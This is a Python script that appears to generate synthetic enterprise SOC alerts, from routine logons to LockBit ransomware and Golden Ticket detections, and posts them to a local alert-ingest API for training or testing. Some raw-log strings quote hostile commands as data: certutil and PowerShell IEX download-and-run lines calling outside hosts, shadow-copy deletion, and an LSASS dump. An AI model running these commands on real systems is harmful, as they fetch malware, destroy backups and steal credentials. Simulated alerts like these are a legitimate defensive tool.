"""
Continuous alert generator — every alert has a real story behind it.
No templates, no random number substitution. Each log line reads like
something a real analyst would actually see in a SOC queue.
"""
import time, random, httpx, os
from datetime import datetime
from dotenv import load_dotenv

load_dotenv()

BASE = "http://localhost:8000"

ALERTS = [

    # ══════════════════════════════════════════════════════
    #  LOW — normal noise, but logged
    # ══════════════════════════════════════════════════════

    {"severity": "LOW", "event_type": "auth_success", "source": "windows_security",
     "source_ip": "10.10.1.42",
     "raw_log": "Successful Kerberos logon: j.hartley@corp.local authenticated to DC01 from WS-FIN-042 at 08:47 — standard morning workstation unlock. No anomalies.",
     "metadata": {"user": "j.hartley", "host": "WS-FIN-042"}},

    {"severity": "LOW", "event_type": "vpn_connect", "source": "firewall",
     "source_ip": "82.34.17.91",
     "raw_log": "VPN tunnel established: m.okonkwo connected from 82.34.17.91 (UK, London — matches registered home office address). Split-tunnel session, MFA passed.",
     "metadata": {"user": "m.okonkwo", "location": "London, UK"}},

    {"severity": "LOW", "event_type": "software_install", "source": "edr",
     "source_ip": "10.10.1.17",
     "raw_log": "Software installation logged: 7-Zip 24.08 installed on WS-HR-017 by s.patel. Package hash matches vendor signature. Authorized by IT ticket #84201.",
     "metadata": {"user": "s.patel", "host": "WS-HR-017", "ticket": "IT-84201"}},

    {"severity": "LOW", "event_type": "file_access", "source": "windows_security",
     "source_ip": "10.10.1.55",
     "raw_log": "Bulk read on \\\\FILE01\\Finance\\Q3-Reports\\ — 47 files opened by a.reyes over 22 minutes. Pattern consistent with quarterly reporting work. User has finance read permissions.",
     "metadata": {"user": "a.reyes", "host": "WS-SALES-055", "share": "FILE01\\Finance"}},

    {"severity": "LOW", "event_type": "dns_query", "source": "dns_server",
     "source_ip": "10.10.1.103",
     "raw_log": "DNS: WS-DEV-103 resolved raw.githubusercontent.com (185.199.108.133) — developer pulling config from personal repo. No threat intel match on domain or IP.",
     "metadata": {"host": "WS-DEV-103", "domain": "raw.githubusercontent.com"}},

    {"severity": "LOW", "event_type": "usb_connect", "source": "edr",
     "source_ip": "10.10.1.8",
     "raw_log": "USB storage device connected to WS-EXEC-008: SanDisk Ultra 64GB (serial SDCZ48-064G-G46). Device is on approved hardware list. User: d.novak. No data classified above INTERNAL transferred.",
     "metadata": {"user": "d.novak", "host": "WS-EXEC-008", "device": "SanDisk Ultra 64GB"}},

    {"severity": "LOW", "event_type": "scheduled_scan", "source": "av",
     "source_ip": "10.10.1.31",
     "raw_log": "Defender full scan completed on WS-OPS-031: 84,212 files scanned, 0 threats detected. Definitions version 1.421.0.0 (updated 6h ago). Scan duration: 38 minutes.",
     "metadata": {"host": "WS-OPS-031", "files_scanned": 84212, "threats": 0}},

    {"severity": "LOW", "event_type": "certificate_expiry", "source": "siem",
     "source_ip": "10.10.2.5",
     "raw_log": "Certificate expiry warning: wildcard cert *.corp.local on WEB-INT01 expires in 28 days (2026-04-28). Issued by corp-CA01. Renewal ticket not yet opened — notify IT PKI team.",
     "metadata": {"host": "WEB-INT01", "days_remaining": 28}},

    {"severity": "LOW", "event_type": "rdp_session", "source": "windows_security",
     "source_ip": "10.10.1.2",
     "raw_log": "RDP session opened by helpdesk01 to WS-HR-017 (s.patel) at 14:22 — IT support ticket #84389 open for 'slow login issue'. Session lasted 18 minutes. No admin tools executed beyond Task Manager and msconfig.",
     "metadata": {"user": "helpdesk01", "target": "WS-HR-017", "ticket": "IT-84389"}},

    # ══════════════════════════════════════════════════════
    #  MEDIUM — needs a look, not yet confirmed malicious
    # ══════════════════════════════════════════════════════

    {"severity": "MEDIUM", "event_type": "auth_fail", "source": "windows_security",
     "source_ip": "10.10.1.22",
     "raw_log": "Account lockout triggered: t.bergmann@corp.local — 6 failed NTLM attempts in 4 minutes from WS-OPS-031. Last successful logon was 3 days ago from this same host. Possible forgotten password after leave, but verify with user.",
     "metadata": {"user": "t.bergmann", "host": "WS-OPS-031", "failed_attempts": 6}},

    {"severity": "MEDIUM", "event_type": "powershell_exec", "source": "edr",
     "source_ip": "10.10.1.103",
     "raw_log": "PowerShell invocation on WS-DEV-103 by r.chen: Get-ADUser -Filter * -Properties * | Export-Csv C:\\Users\\r.chen\\Desktop\\all_users.csv — full AD dump to local CSV. User is in DevOps but not AD admin group. Legitimate dev work or recon?",
     "metadata": {"user": "r.chen", "host": "WS-DEV-103", "cmdlet": "Get-ADUser"}},

    {"severity": "MEDIUM", "event_type": "email_phishing", "source": "mail_gateway",
     "source_ip": "198.51.100.77",
     "raw_log": "Phishing email quarantined before delivery: To: l.andersen@corp.com, From: hr-team@payroll-update-notice.com (domain registered 2 days ago). Subject: 'ACTION REQUIRED: Update your direct deposit details'. Contains credential harvesting link to 185.220.101.45:8080/portal.",
     "metadata": {"recipient": "l.andersen", "sender": "hr-team@payroll-update-notice.com", "link_ip": "185.220.101.45"}},

    {"severity": "MEDIUM", "event_type": "rdp_external", "source": "firewall",
     "source_ip": "103.27.62.41",
     "raw_log": "Inbound RDP attempt to JUMP01.corp.local:3389 from 103.27.62.41 (Singapore — no business relationship, AbuseIPDB flagged). 14 failed login attempts over 8 minutes. Firewall blocked after threshold. No successful authentication.",
     "metadata": {"target": "JUMP01", "attacker_ip": "103.27.62.41", "attempts": 14}},

    {"severity": "MEDIUM", "event_type": "port_scan", "source": "ids",
     "source_ip": "10.10.1.55",
     "raw_log": "Internal port scan from WS-SALES-055 (a.reyes): TCP SYN probes to 10.10.2.0/24 on ports 22, 80, 443, 445, 3306, 3389, 5432 — 118 hosts in 3 minutes. a.reyes has no admin role. Possible unauthorized network mapping.",
     "metadata": {"user": "a.reyes", "host": "WS-SALES-055", "ports": "22,80,443,445,3306,3389,5432"}},

    {"severity": "MEDIUM", "event_type": "sensitive_file_access", "source": "dlp",
     "source_ip": "10.10.1.17",
     "raw_log": "DLP alert: s.patel accessed 23 HR personnel records from \\\\FILE01\\HR\\Personnel\\ including salary bands and SSN fields at 22:41 — outside business hours. User role is HR Coordinator with read access, but volume and timing are abnormal.",
     "metadata": {"user": "s.patel", "host": "WS-HR-017", "records_accessed": 23, "time": "22:41"}},

    {"severity": "MEDIUM", "event_type": "new_local_admin", "source": "windows_security",
     "source_ip": "10.10.2.1",
     "raw_log": "New local admin account created on SQL-PROD01: username 'db_maint_temp' added to Administrators group by svc_deploy at 02:17 — no maintenance window active and no change ticket found in ITSM for this action.",
     "metadata": {"host": "SQL-PROD01", "new_account": "db_maint_temp", "created_by": "svc_deploy"}},

    {"severity": "MEDIUM", "event_type": "impossible_travel", "source": "siem",
     "source_ip": "91.108.4.201",
     "raw_log": "Azure AD impossible travel: k.osei logged in from London at 09:12, then from Kyiv UA (91.108.4.201) at 09:47 — 35 minutes apart, 2,100km distance. MFA satisfied both times — possible authenticator app theft or account compromise.",
     "metadata": {"user": "k.osei", "location_1": "London", "location_2": "Kyiv", "time_delta_min": 35}},

    {"severity": "MEDIUM", "event_type": "macro_blocked", "source": "edr",
     "source_ip": "10.10.1.42",
     "raw_log": "Office macro blocked on WS-FIN-042: j.hartley opened Q3-Forecast-FINAL.xlsm from email attachment. Macro attempted cmd.exe /c certutil.exe -urlcache -f http://cdn-delivery-node.net/p.exe %TEMP%\\svhost.exe — execution blocked by Defender ASR rule. File quarantined.",
     "metadata": {"user": "j.hartley", "host": "WS-FIN-042", "file": "Q3-Forecast-FINAL.xlsm", "blocked": True}},

    # ══════════════════════════════════════════════════════
    #  HIGH — confirmed threat behaviour, needs response
    # ══════════════════════════════════════════════════════

    {"severity": "HIGH", "event_type": "brute_force", "source": "firewall",
     "source_ip": "185.220.101.45",
     "raw_log": "Credential brute force against OWA: 847 POST requests to /owa/auth.aspx from 185.220.101.45 (Tor exit node, AbuseIPDB: 100%) over 12 minutes. 3 accounts targeted: j.hartley, m.okonkwo, it_admin. No successful auth. IP blocked at perimeter.",
     "metadata": {"target": "OWA", "attacker_ip": "185.220.101.45", "requests": 847, "accounts_targeted": 3}},

    {"severity": "HIGH", "event_type": "malware_detected", "source": "av",
     "source_ip": "10.10.1.42",
     "raw_log": "Trojan dropper quarantined on WS-FIN-042: C:\\Users\\j.hartley\\AppData\\Local\\Temp\\AcroRd32Helper.exe — SHA256: a3f1c9b84d2e6f05a7c3b1d8e9f4a2c6. VirusTotal 51/72. File written by WINWORD.EXE 4 minutes earlier via maldoc attachment. Emotet loader signature match.",
     "metadata": {"user": "j.hartley", "host": "WS-FIN-042", "malware": "Emotet", "sha256": "a3f1c9b84d2e6f05a7c3b1d8e9f4a2c6"}},

    {"severity": "HIGH", "event_type": "persistence_registry", "source": "edr",
     "source_ip": "10.10.1.55",
     "raw_log": "Persistence on WS-SALES-055: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key added — value 'OneDriveUpdater' → C:\\ProgramData\\Microsoft\\Update\\msupdate.exe. Binary not signed by Microsoft. Set by powershell.exe (PID 4812) spawned from winword.exe.",
     "metadata": {"host": "WS-SALES-055", "registry_key": "HKCU\\Run\\OneDriveUpdater", "binary": "msupdate.exe"}},

    {"severity": "HIGH", "event_type": "data_staging", "source": "edr",
     "source_ip": "10.10.1.8",
     "raw_log": "Data staging on WS-EXEC-008: d.novak copied 4.2GB from \\\\FILE01\\Finance\\ and \\\\FILE01\\Legal\\ to C:\\Users\\d.novak\\AppData\\Roaming\\temp_sync\\ using robocopy in 7 minutes, then compressed via 7za.exe into password-protected archive out.7z — exfil staging suspected.",
     "metadata": {"user": "d.novak", "host": "WS-EXEC-008", "data_gb": 4.2, "archive": "out.7z"}},

    {"severity": "HIGH", "event_type": "password_spray", "source": "ids",
     "source_ip": "194.165.16.78",
     "raw_log": "Password spray from 194.165.16.78 (RU bulletproof hosting): single password 'Summer2024!' attempted against 67 domain accounts over 18 minutes. 2 successful authentications: c.walsh and helpdesk01. Both sessions immediately terminated and accounts locked.",
     "metadata": {"attacker_ip": "194.165.16.78", "accounts_tried": 67, "successful": ["c.walsh", "helpdesk01"]}},

    {"severity": "HIGH", "event_type": "scheduled_task_abuse", "source": "edr",
     "source_ip": "10.10.1.31",
     "raw_log": "Malicious scheduled task on WS-OPS-031: 'MicrosoftEdgeUpdateTaskMachineUA2' — action runs base64-encoded PowerShell payload every 4 hours. Created at 03:22 by SYSTEM with no active user session. No matching Edge update in software inventory.",
     "metadata": {"host": "WS-OPS-031", "task": "MicrosoftEdgeUpdateTaskMachineUA2", "interval_hours": 4}},

    {"severity": "HIGH", "event_type": "wmi_lateral_movement", "source": "edr",
     "source_ip": "10.10.1.103",
     "raw_log": "WMI remote execution from WS-DEV-103 targeting DC01 (r.chen): wmic /node:DC01 process call create 'powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString(\"http://update-telemetry-svc.com/stage2\")' — living-off-the-land move toward domain controller. T1047.",
     "metadata": {"source": "WS-DEV-103", "target": "DC01", "user": "r.chen", "technique": "T1047"}},

    {"severity": "HIGH", "event_type": "kerberoasting", "source": "ids",
     "source_ip": "10.10.1.22",
     "raw_log": "Kerberoasting attempt from WS-OPS-031 (t.bergmann): TGS tickets requested for 14 service accounts in 90 seconds — svc_backup, svc_deploy, svc_monitor, SQL-PROD01$ and others. RC4 encryption forced on all tickets for offline cracking. T1558.003.",
     "metadata": {"user": "t.bergmann", "host": "WS-OPS-031", "spns": 14, "technique": "T1558.003"}},

    # ══════════════════════════════════════════════════════
    #  CRITICAL — active compromise, immediate response
    # ══════════════════════════════════════════════════════

    {"severity": "CRITICAL", "event_type": "credential_dump", "source": "edr",
     "source_ip": "10.10.1.55",
     "raw_log": "LSASS memory dump on WS-SALES-055: procdump64.exe opened LSASS with PROCESS_ALL_ACCESS and wrote 74MB dump to C:\\Windows\\Temp\\lsass.dmp. Host automatically isolated by EDR — all network connections severed. Mimikatz-style credential harvesting confirmed.",
     "metadata": {"host": "WS-SALES-055", "tool": "procdump64.exe", "dump_mb": 74, "isolated": True}},

    {"severity": "CRITICAL", "event_type": "lateral_movement", "source": "ids",
     "source_ip": "10.10.1.42",
     "raw_log": "Pass-the-hash from WS-FIN-042: NTLM auth to ADMIN$ on DC01, FILE01, MAIL01, SQL-PROD01, and BACKUP01 using extracted hash for j.hartley (domain admin). 5 hosts reached in 4 minutes. svchost.exe dropped on each via SMB share. Active incident — contain now.",
     "metadata": {"source": "WS-FIN-042", "account": "j.hartley", "hosts": ["DC01", "FILE01", "MAIL01", "SQL-PROD01", "BACKUP01"]}},

    {"severity": "CRITICAL", "event_type": "c2_beacon", "source": "firewall",
     "source_ip": "10.10.1.8",
     "raw_log": "C2 beacon confirmed: WS-EXEC-008 → 23.95.97.59:443 with 60-second jitter interval. JA3 fingerprint 51c64c77e60f3980eea90869b68c58a8 matches Cobalt Strike 4.x malleable profile. TLS cert is self-signed with spoofed CN=*.microsoft.com. 847 beacons over 14 hours before detection.",
     "metadata": {"host": "WS-EXEC-008", "c2": "23.95.97.59", "framework": "Cobalt Strike", "beacons": 847}},

    {"severity": "CRITICAL", "event_type": "ransomware_indicator", "source": "edr",
     "source_ip": "10.10.1.31",
     "raw_log": "Ransomware deployment on WS-OPS-031: vssadmin delete shadows /all, bcdedit /set recoveryenabled No, wbadmin delete catalog — all executed in sequence. 312 files renamed to .lockbit in 90 seconds. ISOLATE HOST IMMEDIATELY and escalate to IR team.",
     "metadata": {"host": "WS-OPS-031", "files_encrypted": 312, "extension": ".lockbit", "family": "LockBit"}},

    {"severity": "CRITICAL", "event_type": "dcsync_attack", "source": "ids",
     "source_ip": "10.10.1.103",
     "raw_log": "DCSync attack from WS-DEV-103: r.chen's account used MS-DRSR replication protocol to pull NTDS.dit remotely from DC01. Hashes for 847 accounts extracted including Administrator, it_admin, svc_backup. No DC privilege needed if Replicating Directory Changes ACL is misconfigured. T1003.006.",
     "metadata": {"host": "WS-DEV-103", "user": "r.chen", "target": "DC01", "accounts": 847, "technique": "T1003.006"}},

    {"severity": "CRITICAL", "event_type": "data_exfiltration", "source": "firewall",
     "source_ip": "10.10.1.8",
     "raw_log": "Data exfiltration confirmed: WS-EXEC-008 transferred 6.8GB to 45.142.212.100 (RU hosting, Conti-linked infra) over HTTPS/443 in 34 minutes. Data originated from \\\\FILE01\\Finance\\ and \\\\FILE01\\Legal\\ — matches staging activity logged on this host 2 hours prior.",
     "metadata": {"host": "WS-EXEC-008", "dest": "45.142.212.100", "data_gb": 6.8, "duration_min": 34}},

    {"severity": "CRITICAL", "event_type": "golden_ticket", "source": "ids",
     "source_ip": "10.10.1.22",
     "raw_log": "Golden Ticket detected: Kerberos TGT for Administrator@corp.local presented with 10-year lifetime (standard is 10 hours) and forged PAC. Ticket originated from WS-OPS-031. KRBTGT hash was likely taken in earlier DCSync. All Kerberos sessions are untrusted — reset KRBTGT password twice. T1558.001.",
     "metadata": {"host": "WS-OPS-031", "account": "Administrator", "lifetime_years": 10, "technique": "T1558.001"}},
]

SEV_WEIGHTS = {"LOW": 40, "MEDIUM": 35, "HIGH": 18, "CRITICAL": 7}

def pick_alert():
    sev = random.choices(list(SEV_WEIGHTS.keys()), weights=list(SEV_WEIGHTS.values()), k=1)[0]
    pool = [a for a in ALERTS if a["severity"] == sev]
    return random.choice(pool if pool else ALERTS).copy()

def send(alert):
    try:
        r = httpx.post(f"{BASE}/api/v1/alerts/ingest", json=alert, timeout=10)
        return r.status_code == 200
    except Exception:
        return False

def run():
    print("[GENERATOR] Alert generator started — realistic enterprise SOC events")
    print("[GENERATOR] Ctrl+C to stop\n")
    total = 0
    while True:
        batch = random.randint(1, 4)
        sent = 0
        for _ in range(batch):
            alert = pick_alert()
            if send(alert):
                sent += 1
                total += 1
                pad = " " * (9 - len(alert["severity"]))
                print(f"  [{datetime.now().strftime('%H:%M:%S')}] [{alert['severity']}]{pad}{alert['event_type']:<30} {alert.get('source_ip','')}")
            time.sleep(random.uniform(2, 6))
        delay = random.uniform(30, 90)
        print(f"  ── {sent}/{batch} sent | total: {total} | next in {int(delay)}s\n")
        time.sleep(delay)

if __name__ == "__main__":
    run()
